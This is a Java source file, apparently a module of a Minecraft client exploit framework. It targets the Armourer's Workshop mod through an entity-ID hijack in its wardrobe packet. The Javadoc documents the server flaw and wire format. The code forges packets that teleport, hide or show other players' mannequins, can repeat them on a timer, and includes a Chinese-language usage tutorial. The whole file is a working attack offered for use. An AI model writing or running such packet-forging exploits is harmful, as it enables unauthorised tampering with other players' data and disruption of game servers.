package com.redblue.red.modules.armourersworkshop;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * AW02: UpdateWardrobePacket (ID 4) entity ID hijack.
 *
 * Server checks player.containerMenu instanceof SkinWardrobeMenu but uses
 * entityId from the packet (not from the open menu) to resolve the target.
 * SYNC type is blocked by checkSecurityByServer(). SYNC_OPTION is allowed.
 *
 * Wire format (after 4-byte packetId=4):
 *   writeEnum(Type)       -> writeVarInt(ordinal) [SYNC=0, SYNC_ITEM=1, SYNC_OPTION=2]
 *   writeInt(entityId)
 *   if SYNC_OPTION: GenericValue.write -> writeVarInt(fieldOrdinal) + serializer data
 *
 * Field ordinals for SYNC_OPTION:
 *   13 = MANNEQUIN_POSITION (Vec3: 3x writeDouble)
 *   8  = MANNEQUIN_IS_VISIBLE (Boolean via EntityDataSerializer)
 *   5  = WARDROBE_COLLISION_SHAPE (VarInt size + floats)
 */
public class AW02_WardrobeHijack implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("armourers_workshop", "aw-channel");
    private static final int PACKET_ID = 4;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofEnum("action", "操作",
                "TELEPORT", "TELEPORT", "HIDE", "SHOW"),
        ConfigParam.ofEntity("target_entity", "目标实体ID"),
        ConfigParam.ofFloat("tp_x", "传送 X", 0f, -30000000f, 30000000f)
                .visibleWhen("action", "TELEPORT"),
        ConfigParam.ofFloat("tp_y", "传送 Y", 64f, -64f, 320f)
                .visibleWhen("action", "TELEPORT"),
        ConfigParam.ofFloat("tp_z", "传送 Z", 0f, -30000000f, 30000000f)
                .visibleWhen("action", "TELEPORT"),
        ConfigParam.ofInt("interval", "自动间隔 (tick)", 20, 1, 200)
    );

    private long lastTick = 0;

    @Override public String id() { return "aw02_wardrobe_hijack"; }
    @Override public String name() { return "衣柜劫持"; }
    @Override public String description() {
        return "远程访问其他玩家的衣柜容器";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 先打开自己的衣柜（右键自己或人体模型）\n"
            + "2. 设置目标实体ID（可使用准星拾取）\n"
            + "3. 选择操作: TELEPORT(传送)、HIDE(隐藏)、SHOW(显示)\n"
            + "4. 配置对应参数后执行\n\n"
            + "[参数说明]\n"
            + "目标实体ID: 要操作的人体模型实体ID\n"
            + "传送 X/Y/Z: TELEPORT模式下的目标坐标\n"
            + "自动间隔: 自动执行的tick间隔\n\n"
            + "[注意事项]\n"
            + "执行前必须已打开SkinWardrobeMenu（自己的衣柜界面）。";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("armourers_workshop");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        doAttack(mc);
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        int interval = getParam("interval").map(ConfigParam::getInt).orElse(20);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        doAttack(mc);
    }

    private void doAttack(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        int entityId = getParam("target_entity").map(ConfigParam::getInt).orElse(0);
        if (entityId == 0) return;

        String action = getParam("action").map(ConfigParam::getString).orElse("TELEPORT");

        switch (action) {
            case "TELEPORT" -> sendTeleport(entityId, mc);
            case "HIDE" -> sendVisibility(entityId, false);
            case "SHOW" -> sendVisibility(entityId, true);
        }
    }

    private void sendTeleport(int entityId, Minecraft mc) {
        double x = getParam("tp_x").map(ConfigParam::getFloat).orElse(0f);
        double y = getParam("tp_y").map(ConfigParam::getFloat).orElse(64f);
        double z = getParam("tp_z").map(ConfigParam::getFloat).orElse(0f);

        PacketForge.send(CHANNEL, buf -> {
            buf.writeInt(PACKET_ID);
            // Type = SYNC_OPTION (ordinal 2)
            buf.writeVarInt(2);
            buf.writeInt(entityId);
            // GenericValue: fieldOrdinal=13 (MANNEQUIN_POSITION) + Vec3 (3x double)
            buf.writeVarInt(13);
            buf.writeDouble(x);
            buf.writeDouble(y);
            buf.writeDouble(z);
        });
    }

    private void sendVisibility(int entityId, boolean visible) {
        PacketForge.send(CHANNEL, buf -> {
            buf.writeInt(PACKET_ID);
            buf.writeVarInt(2); // SYNC_OPTION
            buf.writeInt(entityId);
            // fieldOrdinal=8 (MANNEQUIN_IS_VISIBLE), Boolean via EntityDataSerializer
            buf.writeVarInt(8);
            buf.writeBoolean(visible);
        });
    }
}
